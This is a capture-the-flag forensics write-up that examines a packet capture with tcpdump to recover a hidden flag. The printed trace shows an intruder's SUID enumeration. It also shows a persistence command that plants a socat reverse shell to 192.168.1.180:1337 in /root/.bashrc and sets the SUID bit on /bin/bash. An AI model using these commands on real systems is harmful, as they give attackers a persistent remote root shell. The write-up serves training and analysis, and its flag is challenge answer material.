# [Forensics] Wrong spooking season

We are given a pcap file to inspect. Running it through `tcpdump`, we can observe commands being executed and their output at the end of the trace:

```bash
$ tcpdump -r capture.pcap -A
[...]
01:31:07.830530 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [P.], seq 36:74, ack 1039, win 503, options [nop,nop,TS val 3125348282 ecr 1067058470], length 38
E..Z..@.@..Z.........9.h..z.7..............
.I..?..&find / -perm -u=s -type f 2>/dev/null

01:31:07.875020 IP 192.168.1.166.45416 > 192.168.1.180.menandmice-dns: Flags [.], ack 74, win 502, options [nop,nop,TS val 1067064273 ecr 3125348282], length 0
E..4..@.?............h.97.....z.....6......
?....I..
01:31:08.347450 IP 192.168.1.166.45416 > 192.168.1.180.menandmice-dns: Flags [P.], seq 1039:1220, ack 74, win 502, options [nop,nop,TS val 1067064746 ecr 3125348282], length 181
E.....@.?............h.97.....z......<.....
?....I../bin/su
/bin/umount
/bin/mount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh

01:31:08.347499 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [.], ack 1220, win 502, options [nop,nop,TS val 3125348799 ecr 1067064746], length 0
E..4..@.@............9.h..z.7..P...........
.I	.?...
01:31:13.990964 IP 192.168.1.180.43038 > 192.168.1.166.http-alt: Flags [F.], seq 217, ack 1, win 502, options [nop,nop,TS val 3125354442 ecr 1067040349], length 0
E..4U.@.@.`(..............C.xomK...........
.I..?..]
01:31:14.033207 IP 192.168.1.166.http-alt > 192.168.1.180.43038: Flags [.], ack 218, win 508, options [nop,nop,TS val 1067070434 ecr 3125354442], length 0
E..4pc@.?.F.............xomK..C.....*......
?.3..I..
01:31:17.614874 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [P.], seq 74:245, ack 1220, win 502, options [nop,nop,TS val 3125358066 ecr 1067064746], length 171
E.....@.@............9.h..z.7..P.....|.....
.I-.?...echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash

01:31:17.615216 IP 192.168.1.166.45416 > 192.168.1.180.menandmice-dns: Flags [.], ack 245, win 501, options [nop,nop,TS val 1067074018 ecr 3125358066], length 0
E..4..@.?............h.97..P..{......&.....
?.A..I-.
01:31:21.070810 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [P.], seq 245:254, ack 1220, win 502, options [nop,nop,TS val 3125361522 ecr 1067074018], length 9
E..=..@.@..t.........9.h..{.7..P...........
.I;r?.A.ls -lha

01:31:21.071170 IP 192.168.1.166.45416 > 192.168.1.180.menandmice-dns: Flags [.], ack 254, win 501, options [nop,nop,TS val 1067077476 ecr 3125361522], length 0
E..4..@.?............h.97..P..{............
?.Od.I;r
01:31:21.073609 IP 192.168.1.166.45416 > 192.168.1.180.menandmice-dns: Flags [P.], seq 1220:1459, ack 254, win 501, options [nop,nop,TS val 1067077478 ecr 3125361522], length 239
E..#..@.?............h.97..P..{......?.....
?.Of.I;rtotal 20K
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
-rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml
drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target

01:31:21.073626 IP 192.168.1.180.menandmice-dns > 192.168.1.166.45416: Flags [.], ack 1459, win 501, options [nop,nop,TS val 3125361525 ecr 1067077478], length 0
E..4..@.@..|.........9.h..{.7..?...........
.I;u?.Of
```

Especially, we can see the command:

```bash
echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
```

Running the last part, we get the flag:

```bash
$ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```
